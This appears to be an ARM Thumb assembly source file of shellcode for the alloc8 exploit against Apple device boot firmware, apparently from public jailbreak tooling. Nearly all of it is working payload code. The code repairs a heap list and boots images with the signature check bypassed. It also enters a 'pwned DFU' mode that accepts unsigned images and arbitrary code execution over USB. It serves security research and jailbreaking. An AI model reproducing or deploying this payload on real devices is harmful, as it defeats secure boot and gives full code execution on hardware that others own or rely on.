@ alloc8-shellcode.S
@ Author: axi0mX
@ Shellcode for alloc8 exploit with minor improvements:
@ * supports 'exec' magic for code execution over USB
@ * reports PWND:[alloc8] in USB serial number string
@ * enters pwned DFU on boot if home and power buttons are being held and cable is connected

.text
 
.pool
.set free,                              0xBAD00004
.set get_nor_image,                     0xBAD0000a
.set memz_create,                       0xBAD00013
.set memz_destroy,                      0xBAD00014
.set image3_create_struct,              0xBAD00017
.set image3_load_continue,              0xBAD00018
.set image3_load_fail,                  0xBAD00019
.set usb_wait_for_image,                0xBAD00010
.set usb_create_serial_number_string,   0xBAD0000e
.set jump_to,                           0xBAD0000d
.set exit_critical_section,             0xBAD00005
.set cable_connected,                   0xBAD00008
.set power_button_pressed,              0xBAD00007
.set home_button_pressed,               0xBAD00006
.set clean_invalidate_data_cache,       0xBAD00002
.set strlcat,                           0xBAD0000f

.set gNorImg3List,                      0xBAD00003
.set gLeakingDFUBuffer,                 0xBAD00011

.set MAIN_STACK_ADDRESS,                0xBAD00001
.set LOAD_ADDRESS,                      0xBAD0000b
.set MAX_SIZE,                          0xBAD0000c
.set ILLB_MAGIC,                        0xBAD00009
.set MEMZ_STRUCT_MAGIC,                 0xBAD00016
.set IMG3_STRUCT_MAGIC,                 0xBAD00015
.set EXEC_MAGIC,                        0xBAD00012

.global _start

_start:
.code 16
    LDR R0, =MAIN_STACK_ADDRESS
    MOV SP, R0                                  @ SP = MAIN_STACK_ADDRESS

    LDR R0, =clean_invalidate_data_cache
    BLX R0                                      @ clean_invalidate_data_cache()

    LDR R4, =gNorImg3List                       @ R4 = &gNorImg3List

    LDR R1, [R4, #4]                            @ R1 = R4[1]

    LDR R5, [R1, #4]                            @ R5 = R1[1]

    STR R4, [R1, #4]                            @ R1[1] = R4

    STR R1, [R4]                                @ gNorImg3List = R1

    LDR R6, =free                               @ R6 = free

free_loop:
    CMP R4, R5
    BEQ pwned_boot                              @ if (R4 == R5) goto pwned_boot

    MOV R0, R5                                  @ R0 = R5

    LDR R5, [R5, #4]                            @ R5 = R5[1]

    BLX R6                                      @ free(R0)

    B free_loop                                 @ goto free_loop

pwned_boot:
    SUB SP, SP, #0xC                            @ SP -= 0xC

    LDR R3, =exit_critical_section
    BLX R3                                      @ exit_critical_section()

    LDR R3, =home_button_pressed
    BLX R3                                      @ R0 = home_button_pressed()

    CBZ R0, pwned_llb_boot                      @ if (R0 == 0) goto pwned_llb_boot

    LDR R3, =power_button_pressed
    BLX R3                                      @ R0 = power_button_pressed()

    CBZ R0, pwned_llb_boot                      @ if (R0 == 0) goto pwned_llb_boot

    LDR R3, =cable_connected
    BLX R3                                      @ R0 = cable_connected()

    CBNZ R0, pwned_dfu                          @ if (R0 != 0) goto pwned_dfu

pwned_llb_boot:
    LDR R0, =ILLB_MAGIC                 
    LDR R3, =get_nor_image              
    BLX R3                                      @ R0 = get_nor_image(ILLB_MAGIC)

    CBZ R0, pwned_dfu                           @ if (R0 == 0) goto pwned_dfu

    LDR R1, =LOAD_ADDRESS                       
    STR R1, [SP]                                @ SP[0] = LOAD_ADDRESS

    LDR R1, =MAX_SIZE
    STR R1, [SP, #4]                            @ SP[1] = MAX_SIZE

    MOV R1, SP
    ADD R2, SP, #4
    BL image3_load_no_signature_check           @ R0 = image3_load_no_signature_check(R0, &SP[0], &SP[1])

    CBNZ R0, pwned_dfu                          @ if (R0 != 0) goto pwned_dfu

    LDR R1, =LOAD_ADDRESS                       
    MOV R2, #0
    LDR R3, =jump_to
    BLX R3                                      @ jump_to(0, LOAD_ADDRESS, 0)

    /* jump_to should never return */

pwned_dfu:
    MOV R0, #1
    LDR R3, =usb_create_serial_number_string
    BLX R3                                      @ R0 = usb_create_serial_number_string(1)

    ADR R1, PWND_STRING
    MOV R2, #120
    LDR R3, =strlcat
    BLX R3                                      @ strlcat(R0, PWND_STRING, 120)

pwned_dfu_loop:
    LDR R0, =LOAD_ADDRESS
    LDR R1, =MAX_SIZE
    LDR R3, =usb_wait_for_image
    BLX R3 
    MOV R4, R0                                  @ R4 = usb_wait_for_image(LOAD_ADDRESS, MAX_SIZE)

    LDR R5, =gLeakingDFUBuffer
    LDR R0, [R5]
    LDR R3, =free
    BLX R3                                      @ free(gLeakingDFUBuffer)

    MOV R0, #0
    STR R0, [R5]                                @ gLeakingDFUBuffer = 0

    CMP R4, #0
    BLT pwned_dfu_loop                          @ if (R4 < 0) goto pwned_dfu_loop

    LDR R5, =LOAD_ADDRESS
    LDR R0, [R5]                                @ R0 = LOAD_ADDRESS[0]

    LDR R1, =EXEC_MAGIC
    CMP R0, R1
    BEQ pwned_dfu_exec_magic                    @ if (R0 == EXEC_MAGIC) goto pwned_dfu_exec_magic

    LDR R0, =LOAD_ADDRESS
    MOV R1, R4
    MOV R2, #0
    LDR R3, =memz_create
    BLX R3
    MOV R4, R0                                  @ R4 = memz_create(LOAD_ADDRESS, R4, 0)

    CBZ R4, pwned_dfu_loop_end                  @ if (R4 == 0) goto pwned_dfu_loop_end
                         
    STR R5, [SP]                                @ SP[0] = LOAD_ADDRESS

    STR R4, [SP, #4]                            @ SP[1] = R4

    MOV R1, SP
    ADD R2, SP, #4
    BL image3_load_no_signature_check           @ R0 = image3_load_no_signature_check(R0, &SP[0], &SP[1])

    CBNZ R0, pwned_dfu_load_failed              @ if (R0 != 0) goto pwned_dfu_load_failed

    LDR R1, =LOAD_ADDRESS
    MOV R2, #0
    LDR R3, =jump_to
    BLX R3                                      @ jump_to(0, LOAD_ADDRESS, 0)

    /* jump_to should never return */

pwned_dfu_load_failed:
    MOV R0, R4
    LDR R3, =memz_destroy
    BLX R3                                      @ memz_destroy(R4)

pwned_dfu_loop_end:
    B pwned_dfu_loop                            @ goto pwned_dfu_loop

pwned_dfu_exec_magic:
    LDR R0, [R5, #0x8]                          @ R0 = LOAD_ADDRESS[2]      /* arg1 */

    LDR R1, [R5, #0xC]                          @ R1 = LOAD_ADDRESS[3]      /* arg2 */

    LDR R2, [R5, #0x10]                         @ R2 = LOAD_ADDRESS[4]      /* arg3 */

    LDR R3, [R5, #0x14]                         @ R3 = LOAD_ADDRESS[5]      /* arg4 */

    LDR R4, [R5, #0x18]                         /* TODO: Consider replacing with memmove? */
    STR R4, [SP]                                @ SP[0] = LOAD_ADDRESS[6]   /* arg5 */

    LDR R4, [R5, #0x1C]
    STR R4, [SP, #0x4]                          @ SP[1] = LOAD_ADDRESS[7]   /* arg6 */

    LDR R4, [R5, #0x20]
    STR R4, [SP, #0x8]                          @ SP[2] = LOAD_ADDRESS[8]   /* arg7 */
    
    LDR R4, [R5, #0x4]                          
    BLX R4                                      @ R0 = LOAD_ADDRESS[1](R0, R1, R2, R3, SP[0], SP[1], SP[2])

    STR R0, [R5, #4]                            @ LOAD_ADDRESS[1] = R0

    MOV R0, #0
    STR R0, [R5]                                @ LOAD_ADDRESS[0] = 0

    B pwned_dfu_loop                            @ goto pwned_dfu_loop

image3_load_no_signature_check:
    PUSH {R4-R7, LR}                            /* TODO: Rewrite this ugly mess. */

    MOV R6, R11
    MOV R5, R10
    MOV R4, R8
    PUSH {R4-R6}

    ADD R7, SP, #0x18
    SUB SP, SP, #0x60

    STR R2, [SP, #0x10]

    MOVS R3, #0
    STR R3, [SP, #0x50]

    LDR R6, [R1]
    MOV R10, R1
    MOVS R5, R0

    LDR R0, [R5, #4]
    MOV R8, R0

    LDR R1, =MAX_SIZE
    CMP R0, R1
    BGT img3_bad_size

    LDR R0, [R5, #0xC]
    LDR R1, =IMG3_STRUCT_MAGIC
    CMP R0, R1
    BNE not_nor_img3

    MOV R4, R8
    STR R4, [SP]

    LDR R4, [R5, #0x14]
    LDR R0, [R4, #8]
    LDR R1, =LOAD_ADDRESS
    LDR R2, [R4, #0xC]        
    MOVS R3, #0
    LDR R4, [R0, #0x1C]
    BLX R4

    CMP R0, R8
    BNE img3_fail

    B img3_continue

not_nor_img3:
    LDR R1, =MEMZ_STRUCT_MAGIC
    CMP R0, R1
    BNE img3_fail

img3_continue:
    ADD R0, SP, #0x50
    MOVS R1, R6
    MOV R2, R8
    MOVS R3, #0
    LDR R4, =image3_create_struct
    BLX R4

    MOV R4, R0

    CBNZ R4, img3_fail

    LDR R3, =image3_load_continue
    BX R3

img3_bad_size:
    MOV R8, R1

img3_fail:
    MOV R4, #1
    LDR R3, =image3_load_fail
    BX R3

.align 2

PWND_STRING:
.ascii " PWND:[alloc8]\x00"
